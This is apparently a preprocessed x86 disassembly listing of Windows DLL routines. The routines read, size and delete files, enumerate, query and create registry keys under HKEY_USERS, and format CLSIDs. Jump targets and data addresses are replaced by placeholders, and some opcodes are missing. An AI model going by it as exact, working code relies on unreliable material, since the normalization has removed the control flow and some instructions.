push esi
cmp eax [ ebp - 0x14 ]
jne r-xdata
push esi
mov esi [ ebp + 0x28 ]
xor ecx ecx
mov [ ebp + 0x18 ] 0x0
test esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov esi [ ebp + 0x28 ]
xor edx edx
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp + 0x8 ] cx
mov [ ebp + 0x1c ] 0x7
je r-xdata
mov esi [ ebp + 0x28 ]
xor ecx ecx
mov [ ebp + 0x18 ] ebx
cmp esi ebx
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jmp r-xdata
or eax 0xffffffff
lea edx [ esi + 0x4 ]
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
or edx 0xffffffff
lea ecx [ esi + 0x8 ]
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10017680
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c358
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x1c ] 0x8
mov [ ebp - 0x4 ] ebx
jae r-xdata
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp + 0x8 ]
push ebx
push esi
call [ GetFileSize@IAT ]
mov ecx [ edi ]
sub eax ecx
cmp eax 0x5
jae r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push ebx
push ebx
push ecx
push esi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp + 0x8 ]
mov esi 0x8
cmp [ ebp + 0x1c ] esi
jae r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
push ebx
lea eax [ ebp - 0x14 ]
push eax
push 0x4
lea ecx [ ebp - 0x10 ]
push ecx
push esi
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
call [ ReadFile@IAT ]
cmp [ ebp - 0x14 ] 0x4
je r-xdata
push esi
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
mov [ edi ] ebx
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
mov [ edi ] ebx
cmp [ ebp + 0x1c ] esi
jb r-xdata
lea eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
add [ edi ] 0x4
push 0x1
push edx
call sub_1001a8ef
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
lea ecx [ ebp + 0x8 ]
call sub_100018c0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov edx [ ebp + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ecx [ ebp - 0x10 ]
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push ecx
push ebx
push esi
call [ ReadFile@IAT ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
push esi
call [ CloseHandle@IAT ]
add [ edi ] 0xfffffffc
lea ecx [ ebp + 0x8 ]
call sub_100018c0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
add [ edi ] eax
push esi
call [ CloseHandle@IAT ]
push 0x8
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
push ebx
call sub_1001a3eb
add esp 0x4
push esi
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
xor esi esi
mov ecx [ ebp - 0x10 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov esi eax
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp + 0x8 ]
mov [ edi ] 0x0
call sub_100018c0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
lea eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
call sub_100018c0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
sub_100178d0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x3c ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
xor edx edx
push 0xffffffff
push edx
lea eax [ esi + 0x4 ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] dx
call sub_100019e0
lea ecx [ esi - 0x4 ]
call sub_10017680
pop esi
mov esp ebp
pop ebp
retn
sub_10017910
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x40 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
xor edx edx
push 0xffffffff
push edx
lea eax [ esi + 0x20 ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] dx
call sub_100019e0
lea ecx [ esi - 0x4 ]
call sub_10017680
pop esi
mov esp ebp
pop ebp
retn
sub_10017950
push ebp
mov ebp esp
push 0xffffffff
push sub_1002db80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x8
mov ecx esp
xor ebx ebx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] ebx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] ebx
call sub_100033e0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push 0xffffffff
push ebx
lea eax [ esi + 0x20 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] dx
call sub_100019e0
lea ecx [ esi - 0x4 ]
mov [ ebp - 0x4 ] bl
call sub_100174d0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
add eax 0x4
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10017a20
push ebp
mov ebp esp
push 0xffffffff
push sub_1002db80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x8
mov ecx esp
xor ebx ebx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] ebx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] ebx
call sub_100033e0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push 0xffffffff
push ebx
lea eax [ esi + 0x4 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] dx
call sub_100019e0
lea ecx [ esi - 0x4 ]
mov [ ebp - 0x4 ] bl
call sub_100174d0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
add eax 0x4
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10017af0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dbab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x804 ]
push eax
push 0x20019
xor edi edi
push edi
push edi
push 0x80000003
mov [ ebp - 0x804 ] edi
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push 0x7ce
lea eax [ ebp - 0x7de ]
xor edx edx
push edi
push eax
mov [ ebp - 0x7e0 ] dx
call sub_1001a9b0
mov eax [ ebp - 0x804 ]
mov ebx [ RegEnumKeyExW@IAT ]
add esp 0xc
push edi
push edi
push edi
push edi
lea ecx [ ebp - 0x800 ]
push ecx
lea edx [ ebp - 0x7e0 ]
push edx
push edi
push eax
mov [ ebp - 0x800 ] 0x3e8
call ebx
test eax eax
jne r-xdata
xor ecx ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
xor ebx ebx
xor ecx ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_100034e0
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ ebp - 0x800 ] 0x9
ja r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100190f4
xor edi edi
xor eax eax
mov [ ebp - 0x7fc ] ax
mov ebx 0x7
lea eax [ ebp - 0x7e0 ]
mov [ ebp - 0x7e8 ] ebx
mov [ ebp - 0x7ec ] edi
lea edx [ eax + 0x2 ]
mov eax [ ebp - 0x804 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x800 ]
push ecx
lea edx [ ebp - 0x7e0 ]
push edx
inc edi
push edi
push eax
mov [ ebp - 0x800 ] 0x3e8
call ebx
test eax eax
je r-xdata
cmp edi ebx
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_100014e0
cmp edi ebx
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x7e0 ]
push ecx
lea ecx [ ebp - 0x7fc ]
call sub_100034e0
lea eax [ ebp - 0x7fc ]
xor edx edx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] edi
mov [ esi ] dx
call sub_10003860
cmp [ ebp - 0x7e8 ] 0x8
jb r-xdata
jbe r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x7fc ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax esi
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
jmp r-xdata
lea ebx [ edi + edi ]
push ebx
push 0x0
push eax
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10017d60
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dbf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
push 0x1
xor eax eax
mov ebx 0x7
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] ax
call sub_100034e0
lea ecx [ ebp - 0x48 ]
push ecx
add esi 0x48
lea edx [ ebp - 0x64 ]
push esi
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10007d90
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x2
call sub_10007de0
mov esi 0x8
add esp 0x18
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
push 0xf003f
push edi
push eax
push 0x80000003
call [ RegOpenKeyExW@IAT ]
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
mov [ ebp - 0x6c ] edx
cmp [ ebp - 0x18 ] esi
jb r-xdata
xor edx edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x1c
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp + 0x8 ]
push edx
jmp r-xdata
call sub_10019ce4
add esp 0x4
sub_10017ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dc38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
push 0x1
xor eax eax
mov ebx 0x7
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] ax
call sub_100034e0
lea ecx [ ebp - 0x48 ]
push ecx
add esi 0x48
lea edx [ ebp - 0x64 ]
push esi
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10007d90
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x2
call sub_10007de0
mov esi 0x8
add esp 0x18
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
push 0x2
push edi
push eax
push 0x80000003
call [ RegOpenKeyExW@IAT ]
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
push edi
lea edx [ ebp - 0x68 ]
push edx
push edi
push 0x2
push edi
push edi
push edi
push eax
push 0x80000003
call [ RegCreateKeyExW@IAT ]
lea eax [ ebp - 0x2c ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x1c
mov edx [ ebp + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
sub_10018010
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dcb7
mov eax [ fs : 0x0 ]
push eax
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
mov edx [ ebp + 0x2c ]
mov edi ecx
mov ecx [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x68 ] eax
lea ecx [ ebp - 0x2c ]
push ecx
xor esi esi
mov ecx edi
mov [ ebp - 0x4 ] esi
call sub_10017af0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] esi
jne r-xdata
lea edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x74 ]
push eax
call [ StringFromCLSID@IAT ]
mov edx [ ebp - 0x108 ]
xor ecx ecx
mov eax edx
mov [ ebp - 0x90 ] cx
mov ebx 0x7
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x104 ] ecx
nop
mov edi 0x8
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax [ ebp - 0x104 ]
lea ecx [ ebp - 0x90 ]
sar eax 0x1
push eax
push edx
call sub_100034e0
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
call sub_100034e0
push 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] ax
call sub_100034e0
lea ecx [ ebp - 0x64 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0xe4 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10007d90
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x100 ]
push edx
mov [ ebp - 0x4 ] 0x5
call sub_10007de0
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea edx [ ebp - 0xc8 ]
push edx
mov [ ebp - 0x4 ] 0x6
call sub_10013a70
lea ecx [ ebp - 0x90 ]
push ecx
push eax
lea edx [ ebp - 0xac ]
push edx
mov [ ebp - 0x4 ] bl
call sub_10013a70
add esp 0x30
push eax
lea ecx [ edi + 0x48 ]
mov [ ebp - 0x4 ] 0x8
call sub_10003860
mov edi 0x8
cmp [ ebp - 0x98 ] edi
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x9c ] esi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0xb4 ] edi
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x2c
mov ecx [ ebp + 0x8 ]
push ecx
jmp r-xdata
xor eax eax
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb8 ] esi
mov [ ebp - 0xc8 ] ax
cmp [ ebp - 0xec ] edi
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_10019ce4
add esp 0x4
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xf0 ] esi
mov [ ebp - 0x100 ] dx
cmp [ ebp - 0xd0 ] edi
jb r-xdata
mov ecx [ ebp - 0x100 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xd4 ] esi
mov [ ebp - 0xe4 ] cx
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] ax
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x7c ] edi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
sub_10018300
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dce8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x1c
mov [ ebp - 0x2c ] esp
mov ecx esp
xor eax eax
push 0xffffffff
push eax
lea edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] ax
call sub_100019e0
mov ecx esi
call sub_10017d60
mov esi eax
test esi esi
jne r-xdata
mov edx [ ebp + 0x24 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
mov [ ebp - 0x2c ] 0x4
call sub_1001b1b4
add esp 0x10
lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push esi
call [ RegQueryValueExW@IAT ]
push esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x1c ] 0x8
mov esi [ ebp - 0x30 ]
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
mov eax esi
mov edx [ ebp + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x20
sub_10018430
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dd18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x1c
mov [ ebp - 0x2c ] esp
mov ecx esp
xor edi edi
push 0xffffffff
push edi
lea edx [ ebp + 0x8 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edi
push edx
mov [ ebp - 0x4 ] edi
mov [ ecx ] ax
call sub_100019e0
mov ecx esi
call sub_10017d60
mov esi eax
cmp esi edi
je r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov edx [ ebp + 0x24 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
call sub_1001b1b4
mov ebx [ RegQueryValueExW@IAT ]
add esp 0x10
lea ecx [ ebp - 0x2c ]
push ecx
push edi
push edi
push edi
lea edx [ ebp - 0x28 ]
push edx
push esi
call ebx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x2c ]
push 0x1
push ecx
call sub_1001a8ef
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
push esi
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x20
lea eax [ ebp - 0x2c ]
push eax
push edi
push 0x0
push 0x0
lea ecx [ ebp - 0x28 ]
push ecx
push esi
call ebx
push esi
test eax eax
je r-xdata
push esi
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
push 0x8
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
push edi
call sub_1001a3eb
